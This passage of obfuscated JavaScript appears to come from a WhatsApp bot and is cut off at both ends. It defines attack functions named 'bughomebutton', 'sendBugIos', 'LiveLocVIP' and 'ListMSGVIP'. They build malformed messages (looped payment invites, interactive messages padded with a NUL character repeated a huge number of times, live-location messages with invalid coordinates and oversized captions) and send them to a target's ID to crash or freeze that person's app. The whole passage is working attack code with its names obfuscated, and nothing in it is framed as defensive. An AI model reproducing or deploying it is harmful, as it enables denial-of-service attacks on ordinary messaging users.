VxoZap[_0x395a36(0x92,0x99,0x31d,0xf0,0x28a)+_0x1a7eb6(0x2af,0x6b0,0x553,0x3db,0x3de)+'ge'](_0x5e7466,{'paymentInviteMessage':{'serviceType':_0x598ae2[_0x33e095(0x847,0x5b5,0x788,0x40d,0x5fb)],'expiryTimestamp':_0x598ae2[_0x1a7eb6(0x300,0x1b5,0x137,0xa8,-0x22a)](Date[_0x395a36(0x7cb,0x49b,0x584,0x4c9,0x821)](),0x3*0x18cd18a5+-0x7*-0x137a9a65+-0x669bf6b2)}},{'participant':{'jid':_0x5e7466}});continue;case'1':await VxoZap[_0x562d73(0x17a,0x3eb,0xcb,0x27e,0x36)+_0x33e095(0x9b8,0x80d,0x732,0x6fb,0x8b2)+'ge'](_0x5e7466,{'paymentInviteMessage':{'serviceType':_0x598ae2[_0x3f5840(0x579,0x5be,0x7b8,0x4c0,0x601)],'expiryTimestamp':_0x598ae2[_0x33e095(0x812,0xa8e,0xa3e,0x68a,0x8f3)](Date[_0x1a7eb6(0x266,0x3e6,0x348,0x460,0x480)](),0x1e772192*-0x1+0x60beb56c+0x29ddf826)}},{});continue;case'2':await VxoZap[_0x3f5840(0x942,0x693,0x70e,0x59f,0x46b)+_0x33e095(0xa10,0x70b,0x924,0x90b,0x8b2)+'ge'](_0x5e7466,{'paymentInviteMessage':{'serviceType':_0x598ae2[_0x562d73(0x31e,0x44b,0x3f4,0x1a9,0x439)],'expiryTimestamp':_0x598ae2[_0x1a7eb6(0x1f,-0x6a,-0x47,0xa8,0x22c)](Date[_0x395a36(0x335,0x3e3,0x584,0x379,0x312)](),-0x5d42*0x7487+0x95*0x33a2bf+0x1a6b98b*0x49)}},{});continue;case'3':_0x598ae2[_0x1a7eb6(0x2e6,-0x85,0x4be,0x1f8,0xc1)](sleep,0x25bf+-0x14ab+-0x104c);continue;case'4':_0x598ae2[_0x562d73(0x45b,0x33a,0xb8,0x384,0x3d0)](sleep,-0x1*-0x335+0x133*-0xe+0xe5d);continue;}break;}}async function bughomebutton(_0x121543){function _0x341179(_0x578fa0,_0x2da4d2,_0x565d99,_0x55e56b,_0x5aac8e){return _0x307533(_0x578fa0-0x133,_0x55e56b,_0x565d99-0xca,_0x55e56b-0x180,_0x2da4d2-0x28b);}const _0x409014={'vRDHR':function(_0x5dfa50,_0x12632b,_0x440469,_0x46b5a9){return _0x5dfa50(_0x12632b,_0x440469,_0x46b5a9);},'jtxHL':_0x9eb95a(-0x2,0x1d0,0x3cb,0x29b,0xea)+'N','RwfSH':_0x16cba0(0x7dd,0x745,0x877,0xb21,0x8eb)+_0x341179(0x6d6,0x6c4,0x5a9,0x4e8,0x659)+_0x16cba0(0x788,0x71e,0x73b,0x422,0x4f5)+_0x341179(0x384,0x552,0x3df,0x4b4,0x33e)+_0x9eb95a(0x598,0x28f,0x3c5,0x41c,0x311)+_0x16cba0(0x64a,0xb64,0x8de,0x74d,0x894)+_0x18461c(0x272,0x92,0x4fd,0x235,0x143)+_0x16cba0(0x978,0x72d,0xaf7,0x991,0x958)+_0x18461c(0x3a,0x10,-0x175,0x5c,0x18b)+_0x252d50(0x283,0x4fc,0x77,0x1b4,0x275)+_0x252d50(0x319,0x3b9,0x2bc,0x187,0x2cd)+_0x18461c(0x104,0x12,0x159,0x7f,0x108)+_0x18461c(0x105,0x150,0x55,-0x137,-0x376)+_0x341179(0x898,0x7fe,0xa3e,0x6a8,0x93c)+_0x252d50(0x2dc,0x572,0x4f2,0x2b6,0x216)+_0x252d50(0x32e,0xef,0x215,0x2c2,0x204)+_0x16cba0(0x6b9,0x752,0x614,0x686,0x6e4),'FAbWe':_0x9eb95a(0x220,0x432,0x28d,0x27a,0x1dc)+'rl','JBiwq':_0x9eb95a(-0x387,-0x9c,-0x3c6,-0x108,0x119)+_0x16cba0(0x7fb,0x489,0x89d,0x42f,0x6ec)+_0x16cba0(0x675,0x4ce,0x3fd,0x4df,0x636)+_0x18461c(0x2d,0x1fd,0x13c,0x100,0x297)+_0x252d50(0x4bd,0x4f5,0x762,0x33f,0x48c)+_0x18461c(0x236,0x520,0x51d,0x302,0xc4)+_0x18461c(0x237,0x4b0,0xf9,0x210,0x30)+_0x16cba0(0x745,0x378,0x2d7,0x303,0x58b)+_0x252d50(0x4cb,0x3ee,0x6a1,0x475,0x72c)+_0x9eb95a(0x3f8,0x44f,0x3c1,0x2e8,0x1e0)+_0x16cba0(0x5d8,0x6ed,0xa55,0x9dc,0x7d9)+_0x16cba0(0x3ef,0x3e3,0x50f,0x58c,0x66b)+_0x252d50(0x441,0x58d,0x2ad,0x36f,0x1bb)+_0x252d50(0x4db,0x476,0x222,0x548,0x67a)+_0x9eb95a(-0xc6,-0x60,0x2cc,0x1f3,0x11f)+_0x16cba0(0x838,0xb16,0xa94,0x9c0,0x937)+_0x341179(0x59b,0x47a,0x21b,0x1de,0x310)+_0x341179(0x696,0x806,0x7b3,0x5ba,0x55b)+_0x252d50(0x37d,0x22f,0x4b1,0x124,0x3d0)+_0x9eb95a(0x233,0x18f,0x85,0x2dc,0x30b)+_0x18461c(0x2ce,0x1bd,0x2a3,0x2e4,0x3bf)+_0x9eb95a(0x1c1,-0x17e,0xbe,0x114,0xf1)+_0x16cba0(0x5fa,0x597,0x846,0x9f1,0x750)+_0x341179(0x268,0x3eb,0x2c2,0x2fb,0x52b)+_0x252d50(0x3ee,0x61b,0x27f,0x36d,0x636)+_0x341179(0x4dd,0x5c6,0x6bf,0x375,0x84d)},_0x489fff={};_0x489fff[_0x16cba0(0xbff,0xc30,0x9b6,0xc34,0x9f2)]='';function _0x18461c(_0x265f70,_0x2a152d,_0x18020a,_0x14b8f4,_0x3811a6){return _0x30a091(_0x14b8f4- -0x55,_0x265f70,_0x18020a-0x1d1,_0x14b8f4-0x5d,_0x3811a6-0x69);}function _0x9eb95a(_0x4f6635,_0x3910d2,_0x271c04,_0x51487a,_0x57cca4){return _0x29f0b3(_0x4f6635-0x22,_0x3910d2-0xbc,_0x4f6635,_0x51487a-0x12f,_0x51487a- -0x3f);}_0x489fff[_0x9eb95a(-0x26c,-0x312,-0xa,-0xb1,-0x1ad)+_0x16cba0(0x8b1,0x673,0x68a,0x5d0,0x852)]='\x20';function _0x16cba0(_0x285d7b,_0x8e0af4,_0x1d1d0b,_0x12b6df,_0x293a27){return _0xf1b353(_0x285d7b-0xe5,_0x8e0af4-0x59,_0x8e0af4,_0x12b6df-0x7c,_0x293a27-0x235);}function _0x252d50(_0x3e3ec4,_0x49e27e,_0x57f54a,_0x3afcf9,_0x24a5db){return _0x307533(_0x3e3ec4-0x1cc,_0x49e27e,_0x57f54a-0x17c,_0x3afcf9-0x1b3,_0x3e3ec4-0x23d);}var _0x76b638=_0x409014[_0x9eb95a(0x27,-0x341,-0x7b,-0x10a,-0xc5)](generateWAMessageFromContent,_0x121543,proto[_0x16cba0(0x969,0x853,0x98a,0xa63,0x893)+'ge'][_0x341179(0x54a,0x33f,0x16d,0x16c,0x494)+_0x16cba0(0xa63,0x6a8,0x9ae,0x93a,0x945)]({'viewOnceMessage':{'message':{'interactiveMessage':{'header':_0x489fff,'body':{'text':_0x409014[_0x341179(0xbb,0x35c,0x466,0x300,0x36f)]},'footer':{'text':_0x409014[_0x252d50(0x631,0x4ee,0x62a,0x41b,0x63b)]},'nativeFlowMessage':{'buttons':[{'name':_0x409014[_0x18461c(0x11d,-0xfc,0x27,-0x6e,-0x1ed)],'buttonParamsJson':_0x409014[_0x252d50(0x608,0x6c1,0x4bf,0x506,0x3a0)]}],'messageParamsJson':'\x00'[_0x9eb95a(0x49,0x181,0x476,0x1c8,-0x73)+'t'](-0xf69*-0xb2+0xcec08+0x2a0e*-0x33)}}}}}),{'userJid':_0x121543,'quoted':m});await VxoZap[_0x18461c(0x28b,0xae,0x23b,-0x44,-0x191)+_0x341179(0x6da,0x688,0x7fa,0x700,0x7dd)+'ge'](_0x121543,_0x76b638[_0x16cba0(0x992,0x787,0xa16,0xaf4,0x997)+'ge'],{'messageId':_0x76b638[_0x16cba0(0xa12,0x7a0,0x8ab,0x7ad,0xa3d)]['id']});}async function sendBugIos(_0x4d21d1){function _0x100b57(_0x4986a9,_0x5d669e,_0xba46fc,_0x34d732,_0x3da3d5){return _0x307533(_0x4986a9-0x32,_0xba46fc,_0xba46fc-0x13f,_0x34d732-0xa6,_0x3da3d5- -0x106);}const _0x311139={'qLbSp':function(_0x364f44,_0x5de4c6){return _0x364f44(_0x5de4c6);},'GibxK':function(_0x4efbb2,_0x2ac663){return _0x4efbb2(_0x2ac663);}};_0x311139[_0x50a27f(0x1d,-0x15f,0x54,0x176,0x2a1)](iponcrash,_0x4d21d1),_0x311139[_0x50a27f(0x36e,0x399,0x36a,0x174,-0x1e)](sleep,0x1*0x25b+0x349+-0x3b0);function _0x50e5b1(_0x51fbff,_0x3640c5,_0x1cfe0b,_0x368e91,_0x1837f8){return _0xf1b353(_0x51fbff-0xf7,_0x3640c5-0x1c,_0x1837f8,_0x368e91-0x109,_0x368e91- -0x171);}function _0x50a27f(_0x2c736f,_0x38aae0,_0x3aa7b4,_0x1990b4,_0x55269d){return _0x307533(_0x2c736f-0xdc,_0x38aae0,_0x3aa7b4-0x10,_0x1990b4-0x53,_0x1990b4-0xf);}_0x311139[_0x50e5b1(0x2b9,0x445,0x4ad,0x257,0x105)](sendExtendedTextMessage,_0x4d21d1);}const _0x51b48d={};_0x51b48d[_0x30a091(0x74,0x208,-0x21f,-0x23,0xf2)+_0x279901(0x208,0x4b8,0x541,0x2f6,0x3ee)]=_0x29f0b3(0x432,0x1a8,0x3b4,-0x9e,0x164)+_0x29f0b3(-0x2a9,0x6e,0x9b,-0x293,-0x79)+_0xf1b353(0x3c1,0x67d,0x7f3,0x463,0x64c)+'t';const _0x573e57={'participant':_0x29f0b3(-0x1ed,-0x191,0x1ab,0x203,-0x5c)+_0x307533(0x335,0x11d,0xe2,0x2ce,0x1a4)+_0xf1b353(0x517,0x51b,0x4e7,0x3c4,0x552)+'t',...m[_0x307533(0x3ca,0x238,0x258,0xcc,0x1c4)]?_0x51b48d:{}},_0x19b5de={};_0x19b5de[_0x279901(0x64d,0x6a9,0x60c,0x4bf,0x4dc)]=_0x279901(0x23d,0x1cc,0x53b,0x432,0x3fc)+_0xf1b353(0x985,0x6d8,0x734,0x5df,0x7c1)+_0x307533(0x373,0x1cf,0x3e0,0x554,0x4a1)+_0xf1b353(0x3e5,0x6a1,0x60e,0x67b,0x57a)+_0x29f0b3(0x320,0xe0,0x1c,0xc9,0x15f)+_0x307533(0x480,0x824,0x3f9,0x2f3,0x56a)+_0x307533(-0x26f,0x4d,-0x1af,0x47,0x2b)+_0x307533(0x198,0x13,0x10d,-0xc2,0x1b7)+_0x30a091(-0x2a,0x27,-0x142,0x49,-0x1bc)+_0x307533(0x138,0x18,0x75,0x11f,0x7f)+_0xf1b353(0x8b0,0x7f3,0x44c,0x8f2,0x61e)+_0x279901(0x1a4,-0x3b,0x429,0x265,0x50)+_0x29f0b3(0x45b,0x435,0x5b1,0x324,0x443)+_0x307533(0x219,0x2f8,-0x64,0x154,0x170)+_0x29f0b3(0x151,0x1e5,0x24f,0x295,0x266)+_0xf1b353(0x3a8,0x2f7,0x4e5,0x284,0x406)+_0x30a091(0x38b,0x211,0x634,0xdf,0x5a5);const _0xfd4706={};_0xfd4706[_0x279901(0x142,0x3dd,0x444,0x1e7,0xc4)+_0x29f0b3(0x304,0x13c,0x27e,0xff,0x1eb)+_0x279901(0x43e,0x5f1,0xce,0x32c,0x34e)+_0xf1b353(0x4e9,0x443,0x5ca,0x535,0x395)]=_0x19b5de;function _0x307533(_0x38a247,_0x1c5612,_0x5cd57a,_0x5b0359,_0x3f21ca){return _0x28c5(_0x3f21ca- -0x119,_0x1c5612);}const _0x5a34c7={};_0x5a34c7[_0x30a091(0x39d,0x283,0x356,0x1fd,0x48b)]=_0x573e57;function _0x29f0b3(_0x337ef0,_0xebbad1,_0x10f6f4,_0x5126b3,_0x1670d1){return _0x28c5(_0x1670d1- -0x256,_0x10f6f4);}_0x5a34c7[_0x279901(0x4bf,0x1eb,0x6d5,0x464,0x560)+'ge']=_0xfd4706;const vareltzybugnew=_0x5a34c7,_0xb8df95={};_0xb8df95[_0x307533(0x397,0x194,-0x38,0xcc,0x27e)+_0x307533(0x1f0,0x2d9,0x598,0x2d4,0x393)]=_0x30a091(0x97,-0x8e,-0x1e,0x32f,0x194)+_0x307533(0x2fd,-0x19d,0x174,-0x196,0xc4)+_0x29f0b3(0x174,0x24b,0x302,-0x8,0x2ae)+'t';const _0x4e26a3={'participant':_0x29f0b3(-0x206,0xd,-0x1bd,0xf7,-0x5c)+_0x29f0b3(0xdb,0x244,0x45,-0x1af,0x67)+_0x279901(-0x46,0x12c,0x4a9,0x254,0x4a0)+'t',...m[_0x307533(0x2d3,0x258,-0x7b,0x189,0x1c4)]?_0xb8df95:{}},_0x5f574f={};_0x5f574f[_0x29f0b3(-0x27a,0x3f,-0x1b8,-0x17,-0x100)]=_0x29f0b3(0x6d,0x23,0x53,0x2f,0x17b)+_0xf1b353(0x4ec,0x724,0x4d1,0x94a,0x6f9)+_0xf1b353(0x248,0x453,0x44f,0x497,0x4f8),_0x5f574f[_0x30a091(-0x17f,-0x3d9,-0x270,-0x3d1,-0x133)+_0x307533(0x23d,0x19d,0x3bd,0x488,0x323)+_0x30a091(-0x56,0x208,-0x228,-0x214,0x1d1)+'n']=_0x29f0b3(0x730,0x388,0x591,0x3ab,0x46b)+_0x29f0b3(0x369,0x22d,0x53d,0x2e7,0x38f)+_0x307533(0x331,0x148,-0xa9,0x2be,0x1c6)+_0x279901(0x69e,0x1fc,0x3c5,0x45a,0x1cb)+_0x29f0b3(0x3d9,0x650,0x3c1,0x281,0x3fa)+_0xf1b353(0x70b,0x7b5,0x771,0x456,0x5f6)+_0x307533(0x800,0x41a,0x5ae,0x6a2,0x529)+_0x30a091(0x1cb,0x2a9,0x405,-0x108,-0xeb)+_0xf1b353(0x67e,0x67e,0x427,0x4b0,0x56b)+_0xf1b353(0x620,0x6da,0x817,0x5df,0x7aa)+_0x279901(0x3cd,0x510,0x2ed,0x268,0x508)+_0x307533(0x3d,0x2c7,0x5,0x111,0x25a)+_0x279901(-0x337,-0x2f1,0x173,-0x64,-0x2fd)+_0x29f0b3(0x3e,-0x91,-0xee,0x1c2,0xb0)+_0x279901(0x280,-0xc1,-0xa3,0x1c1,-0xa9)+_0x29f0b3(0x309,0x20e,0x2ec,0x180,0x29b)+_0x279901(-0xea,0x1a5,-0x3e,-0x64,0x24b)+_0x29f0b3(0xa2,0x206,0x32c,-0x11a,0x15e)+_0x29f0b3(0xe,-0x2b6,0x5f,-0x24a,-0x41)+_0x279901(0x97,-0xfc,-0x1be,-0x46,-0x11d)+_0x279901(0x2b3,0x49d,0x3ac,0x4a2,0x4b3)+_0x307533(0x354,0xba,0x2ab,0x34b,0x12f)+_0x29f0b3(0x299,0x432,0x1c2,0x49c,0x20a)+_0x30a091(-0x14,0xf8,-0x132,-0x1dc,0x1e1)+_0x30a091(0x384,0x1ea,0xd6,0x41e,0x10b)+_0x279901(0x29f,0x96,0x36e,0x276,0x1ec)+_0x307533(0x1bb,0x422,0x566,0x4cb,0x3c2)+_0xf1b353(0x453,0x551,0x777,0x758,0x714)+_0x29f0b3(0x2b1,-0x74,0x5f,0x3ae,0x16b)+_0x30a091(0x374,0x535,0x607,0x231,0x393)+_0x307533(0x57e,0x66a,0x5a3,0x559,0x3fb)+_0x29f0b3(0x64e,0x5c7,0x37f,0x5a0,0x390)+_0x307533(0x22f,0x6e6,0x365,0x29b,0x46e)+_0x307533(0x41d,0x3ef,0x2a0,0x519,0x2b3)+_0x29f0b3(0x147,0x36e,0x1ff,0x173,0x16a)+_0x29f0b3(0x21b,0x6a0,0x547,0x1dc,0x3ef)+_0x30a091(0x385,0x214,0x2f9,0xe3,0x326)+_0x30a091(-0x17d,-0x89,-0x353,0xbb,-0x160)+_0x279901(0x4fa,0x237,0x698,0x40f,0x309)+_0x279901(0xa6,0x353,0x287,0x34d,0x195)+_0x29f0b3(0xf5,-0x285,-0x1b6,0x17a,-0xc2)+_0x307533(0x1e0,0x67f,0x19d,0x24d,0x42b)+_0xf1b353(0x62e,0x7db,0x6e5,0x6f0,0x69d)+_0x307533(0x3a6,0x1ad,0x3ab,0x68f,0x3dc)+_0x279901(0x3bd,0x44d,-0x44,0x262,0x346)+_0x279901(0x2df,0x49e,0x135,0x395,0xc2)+_0x279901(-0x1db,-0x1ac,0x2db,0x73,0x2b9)+_0x279901(0x3af,0x182,0x405,0x249,0x4b5)+_0x307533(-0x97,0x1cb,0xc,-0x170,0x8e)+_0x30a091(-0x18f,-0x3e3,-0xcf,-0x9c,0x6f)+_0x279901(0x3c8,0x6a3,0x41c,0x4ef,0x4be)+_0x307533(0x6b3,0x645,0x467,0x47f,0x59d)+_0x30a091(-0x103,-0x1a5,0x7b,0x53,-0x345)+_0x30a091(0x28d,0x266,0x460,0x46c,0x87)+_0x279901(0x3a9,0x28,0x11c,0x179,-0xf2)+_0xf1b353(0xd1,0x500,0x43d,0x3a6,0x363)+_0xf1b353(0x53d,0x13f,0x394,0x221,0x3fe)+_0x279901(0x4ba,0x521,0x657,0x382,0x16f)+_0x29f0b3(0x201,0xe7,-0x210,0x30d,0x88)+_0x29f0b3(0x1cd,0x2b0,0x702,0x279,0x465)+_0x29f0b3(-0xe,-0x2f,0x174,0x34f,0xae)+_0x279901(-0xb0,0x147,-0x2a4,-0x7,-0x16b)+_0xf1b353(0x44c,0x440,0x402,0x323,0x3eb)+_0xf1b353(0x7be,0x653,0x5ed,0x6d2,0x6d2)+_0xf1b353(0x735,0x66f,0x68c,0x85a,0x786)+_0xf1b353(0x608,0x2e6,0x2b4,0x455,0x3bd)+_0x29f0b3(-0x227,0x26,-0x353,-0x9,-0x7f)+_0xf1b353(0x9,0x4f1,0x523,0x51b,0x2c7)+_0x307533(-0x7b,0x1c,0xc9,0x4c,0x161)+_0x279901(0x59a,0x628,0x1ad,0x422,0x62f)+_0x307533(0x39b,0x506,0x15b,0x2b9,0x2a0)+_0x30a091(0x6f,0x256,0xf9,0x272,0xd1)+_0x30a091(-0xfd,0x8f,-0x1f4,-0x52,-0x161)+_0x29f0b3(0x4e9,0x595,0x25b,0x493,0x368)+_0x279901(0x133,0x2db,0x444,0x234,0x14f)+_0x29f0b3(0x41d,0x4cc,0x35d,0x486,0x475)+_0x279901(0x199,0x4dc,0x1b4,0x45e,0x70e)+_0x279901(0x1da,0x76,-0x221,0x6a,0xea)+_0x307533(0x22d,0x2f3,0x640,0x7b2,0x4e1)+_0xf1b353(0x1a,0xfc,0x57b,0x570,0x2c1)+_0xf1b353(0x48f,0x272,0x4e4,0x6c5,0x422)+_0xf1b353(0x67b,0x65a,0x686,0x206,0x444)+_0xf1b353(0x513,0x35e,0x130,0x2a2,0x3b3)+_0x29f0b3(-0x75,-0x113,0x139,0xb0,0x11f)+_0x30a091(0x50,-0x100,0x2c9,-0x70,-0x73)+_0xf1b353(0x7f5,0x54f,0x569,0x850,0x638)+_0x29f0b3(0x1f0,-0x9a,-0x31c,-0x2cb,-0x97)+_0x279901(0x1b2,0x1b5,0x543,0x283,0x35c)+_0x30a091(0x1ba,-0xab,-0x19,0x7d,0x2bb)+_0xf1b353(0x13c,0xe4,0x490,0x503,0x2c4)+_0x29f0b3(0x2cb,0x380,0x4b9,0x371,0x1ee)+_0x30a091(0x1cc,-0xe1,-0x1b,0x2bf,-0xa4)+_0x279901(0x276,0x191,0x144,0xb0,0x124)+_0x279901(-0xc5,-0x12,0x31d,0x109,0x183)+_0x29f0b3(0x415,0x24c,0x43e,0x2e1,0x26b)+_0xf1b353(0x1bb,0x1c4,0x5b1,0x4bd,0x314)+_0x279901(0x1a2,0x349,0x9,0x144,0x3eb)+_0x279901(0x3ef,0x3d0,0x1e0,0x272,0x72)+_0x307533(0x392,0x43a,0x327,0x348,0x430)+_0x279901(-0x2b5,-0x1ef,-0x287,-0x6d,-0x1f9)+_0x30a091(-0x22,0x40,0x120,-0x2f2,-0x2b3)+_0x30a091(0x108,-0xa4,0x1b1,0x39c,0x2b0)+_0xf1b353(0x3af,0x4da,0x290,0x24e,0x3f8)+_0x279901(0x199,-0x1d,-0x152,0x67,0xf4)+_0x307533(0x5e4,0x7e9,0x312,0x55e,0x5bc)+_0x30a091(0x3e,0xe5,0x294,-0x10,0x1e8)+_0xf1b353(0x4a9,0x38f,0x41d,0x3c0,0x540)+_0x30a091(0x184,-0x4b,-0xad,0x3f7,0x73)+_0x29f0b3(0x29f,0x255,0x3eb,0x181,0x35f)+_0x279901(-0x1ef,0x2cc,0x24c,0x65,0x1d5)+_0xf1b353(0x15b,0x413,0x154,0x5d4,0x3fe)+_0x307533(0x214,0x43a,0x695,0x4f3,0x41f)+_0x279901(0x302,0x600,0x13d,0x3af,0x1a3)+_0x307533(0x47a,0x32c,0xe6,0x3f2,0x2d4)+_0x30a091(-0x4b,0xd9,0x21e,-0xd,-0x1f5)+_0x279901(0x8c,0x2e2,0x4d,0x312,0x21f)+_0x307533(-0x24c,0x2e2,-0x8a,0x17d,0x86)+_0x307533(0x3dc,0x64c,0x49c,0x47e,0x55e)+_0x279901(0x2dd,0x465,0x272,0x2c3,0x46f)+_0x279901(-0xcd,-0xcf,0x33e,0x105,-0x1c8)+_0x30a091(0x110,0xf1,0x25c,0xf1,0x166)+_0x307533(0x154,-0x1ff,0x24e,-0x7f,0x94)+_0x279901(0xb3,0x1a8,0x1eb,0x1dd,0x383)+_0x307533(0x165,0x3c3,0x97,0x4ba,0x2f8)+_0xf1b353(0x79f,0x485,0x7e3,0x8f5,0x699)+_0x29f0b3(0x22e,0x1d,0x3e,0x2d7,0x177)+_0x30a091(0x377,0x3e8,0x1dc,0xf6,0x30d)+_0x307533(-0x16c,-0x4f,0x1fc,-0x113,0xc3)+_0x30a091(0x160,0x12c,0x2b7,-0xc1,0x1e2)+_0x279901(-0x4,-0x21f,-0xc2,0xb7,0x28d)+_0x279901(0x3d3,0x55a,0x4c0,0x311,0x2b0)+_0x29f0b3(-0x119,-0x137,-0x42,0x273,0x93)+_0x307533(0x40d,0x0,0x1d0,0x34d,0x19b)+_0x279901(-0xfb,-0xf9,-0xf6,0x1b5,0x169)+_0x279901(-0x13c,0x3a5,0x27b,0x14e,0x1f1)+_0x30a091(0x18e,0x37e,0x253,0x3d1,-0xb3)+_0x29f0b3(-0x36,0xc,0x179,0x135,0x182)+_0x30a091(0x267,0x214,0x3f4,0x47f,0x526)+_0x29f0b3(0x6aa,0x4cc,0x301,0x672,0x3e8)+_0x30a091(-0xae,-0x23d,0x15a,-0x37a,-0x12)+_0x307533(0x795,0x5ed,0x5f4,0x64d,0x4de)+_0xf1b353(0x620,0x6d4,0x57c,0x6ee,0x66c)+_0xf1b353(0x2fb,0x524,0x45f,0x596,0x511)+_0x279901(0x7f,0x35d,0x467,0x266,0x1db)+_0xf1b353(0x751,0x4be,0x62f,0x562,0x74e)+_0x307533(0x2cd,0x4fb,0x47e,0x229,0x3d8)+_0x307533(0x3bb,0x552,0x7ef,0x601,0x53c)+_0x279901(0x6a9,0x63d,0x21c,0x436,0x4c0)+_0x29f0b3(0x1d4,0x10e,0x7b,-0xaf,0x181)+_0x279901(0x4bc,0x589,0x2b5,0x42e,0x5a9)+_0x30a091(0x39,-0x1ed,0x27b,0xba,0x51)+_0xf1b353(0x186,0x39e,0x49a,0x1ed,0x3cd)+_0x279901(0x397,0x3f2,0x516,0x2f4,0x151)+_0xf1b353(0x56f,0x5fd,0x5ec,0x29d,0x399)+_0x30a091(-0x1a9,-0x2c9,-0x5,-0x9d,-0x3b4)+_0x279901(0x51c,0x422,0x483,0x368,0xce)+_0xf1b353(0x27f,0x467,0x1a2,0x4bc,0x28d)+_0x279901(0x4c6,0x4b7,0x449,0x4ba,0x5ef)+_0x279901(-0x145,-0x186,0x152,0x125,0x24c)+_0x307533(0x27e,0x543,0x2ea,0x1be,0x3b9)+_0x30a091(-0x1c3,-0x48c,-0x1f5,0x101,-0x19)+_0x307533(0x43f,0x538,0x3ee,-0x30,0x27d)+_0x30a091(-0x86,-0x21d,-0x5d,-0x1c2,-0x6c)+_0x307533(0x2a2,0x6a0,0x2d4,0x4a7,0x42f)+_0xf1b353(0x451,0x2f7,0x2c6,0x3b7,0x4c0)+_0x30a091(0x34c,0xfc,0xf8,0x2a4,0x4b2)+_0x30a091(0x146,-0xa5,0x311,0x351,0xa)+_0x279901(0x40c,0x1cb,0x192,0x323,0x1a6)+_0x307533(0x48d,-0x4,0x1c2,0x31c,0x237)+_0x279901(-0x256,0x1ea,-0x1a3,-0x3e,-0xfc)+_0xf1b353(0x49b,0x124,0x194,0x1dc,0x32f)+_0x279901(0x4b5,0x54f,0x17d,0x2ed,0x397)+_0x29f0b3(-0x89,0x217,0x26d,-0xb8,0x1a3)+_0xf1b353(0x65e,0x613,0x55e,0x172,0x39a)+_0x29f0b3(0xa5,0x160,-0x4b,-0x1c5,0x4b)+_0x30a091(0x3e,0xa6,-0x229,0x2df,0x64)+_0x29f0b3(0x30b,0x242,0x66,-0x17,0x1a2)+_0x29f0b3(-0x30,0xea,-0x38,0x1c7,0x251)+_0xf1b353(0x3c4,0x50e,0x497,0x7b7,0x586)+_0x30a091(-0x108,-0x192,-0x101,-0x124,-0x25a)+_0x30a091(-0x6d,-0x130,0x25b,0x1f2,-0x262)+_0x307533(0x4c8,0x5df,0x567,0x1a3,0x41f)+_0x30a091(0x242,0x283,0x263,0x173,0x13a)+_0x30a091(0xca,0x303,0x1a6,0x2b0,-0xf8)+_0x279901(0x399,-0x48,0x1a5,0x122,0x303)+_0x29f0b3(-0x1ed,0xa3,-0x86,-0xb6,-0x80)+_0x29f0b3(0x271,0x4e3,0x1e8,0x130,0x238)+_0x29f0b3(0x3e6,0x114,0x324,0x23,0x25a)+_0x279901(0x1af,0x378,0x4b5,0x2bd,0x22f)+_0x307533(0x6c4,0x6f3,0x6ab,0x376,0x52b)+'}';const _0xefc556={};_0xefc556[_0x307533(-0x171,0xee,0x1e1,0x155,0x8b)+'ns']=[_0x5f574f];const vareltzyhuraa={'key':_0x4e26a3,'message':{'interactiveMessage':{'header':{'hasMediaAttachment':!![],'jpegThumbnail':fs[_0x30a091(-0xb9,0xb,0x17,0x192,-0x52)+_0x279901(0x120,0x5d9,0x2a0,0x3d3,0x376)+'nc'](_0x29f0b3(0x426,0x2df,-0xa3,0x3ea,0x217)+_0x279901(0x470,0x492,0x5f6,0x4e8,0x44c)+_0xf1b353(0x5f5,0x6c6,0x666,0x699,0x6a2)+_0x29f0b3(0x523,0x10b,0x504,0x469,0x2e3)+'ng')},'nativeFlowMessage':_0xefc556}}};async function LiveLocVIP(_0x595a90){function _0x1366e5(_0x82d99,_0xdf015b,_0x126f9f,_0x36764a,_0x23d101){return _0x279901(_0x126f9f,_0xdf015b-0x131,_0x126f9f-0x39,_0x36764a-0x58f,_0x23d101-0x33);}function _0x2ec128(_0x590aae,_0x4fc78d,_0xfeb60,_0x12c81a,_0x1d2bf0){return _0x307533(_0x590aae-0x1dc,_0x12c81a,_0xfeb60-0xde,_0x12c81a-0x27,_0x590aae- -0x26a);}const _0x33a0db={'XfAle':function(_0x4125f0,_0x228747,_0x3672e4,_0x530961){return _0x4125f0(_0x228747,_0x3672e4,_0x530961);},'wJSgr':_0x524534(0x782,0x687,0x60c,0x5a8,0x460)+_0x2ec128(-0x3a,0x4e,-0xc1,-0x8f,-0x155)+_0x2ec128(0x20d,0x37f,0x2c9,0x39e,0x67)},_0x43a4be=_0x33a0db[_0x2ec128(0x68,0x170,-0x2c,0x21b,-0x76)](generateWAMessageFromContent,_0x595a90,proto[_0x2ec128(0x193,0x385,0x440,0x33f,-0x110)+'ge'][_0x28fba3(0xe3,0x28d,0x19c,-0x25,0x1f6)+_0x1366e5(0xaf4,0xa09,0x7a2,0x9a1,0xaf8)]({'viewOnceMessage':{'message':{'liveLocationMessage':{'degreesLatitude':'p','degreesLongitude':'p','caption':_0x33a0db[_0x415f62(0x6be,0x716,0x859,0x7d0,0x8a6)][_0x524534(0x72b,0x48a,0x6ec,0x3e6,0x74d)+'t'](0xb77*-0x2+-0x185e1+-0xf4f*-0x29),'sequenceNumber':'0','jpegThumbnail':''}}}}),{'userJid':_0x595a90});function _0x28fba3(_0x22d0f7,_0x429349,_0x532424,_0x471ea9,_0x59da84){return _0x279901(_0x471ea9,_0x429349-0x169,_0x532424-0x1e5,_0x532424-0x185,_0x59da84-0x117);}function _0x415f62(_0x4d99e4,_0x320247,_0x2da0e4,_0xf797bd,_0x21058c){return _0x307533(_0x4d99e4-0x171,_0x320247,_0x2da0e4-0x10d,_0xf797bd-0x13d,_0xf797bd-0x47b);}function _0x524534(_0x37d368,_0x584982,_0x3e4056,_0xfb4c6a,_0x3061e6){return _0xf1b353(_0x37d368-0x78,_0x584982-0xef,_0x37d368,_0xfb4c6a-0x12e,_0x584982- -0x11b);}await VxoZap[_0x28fba3(0x3cd,0x1c4,0x303,0x539,0x2c1)+_0x1366e5(0x9ed,0x8d6,0xba3,0x8ef,0x8b8)+'ge'](_0x595a90,_0x43a4be[_0x1366e5(0xaac,0x82b,0xcc9,0x9f3,0xb5f)+'ge'],{'participant':{'jid':_0x595a90},'messageId':_0x43a4be[_0x415f62(0xa94,0x785,0xad9,0xa22,0x7ab)]['id']});}async function ListMSGVIP(_0x276400){const _0x36a984={'GzBtA':function(_0xe507d1,_0x2509ed,_0x188193,_0x13d698){return _0xe507d1(_0x2509ed,_0x188193,_0x13d698);},'REJsG':function(_0x163324,_0x451642){return 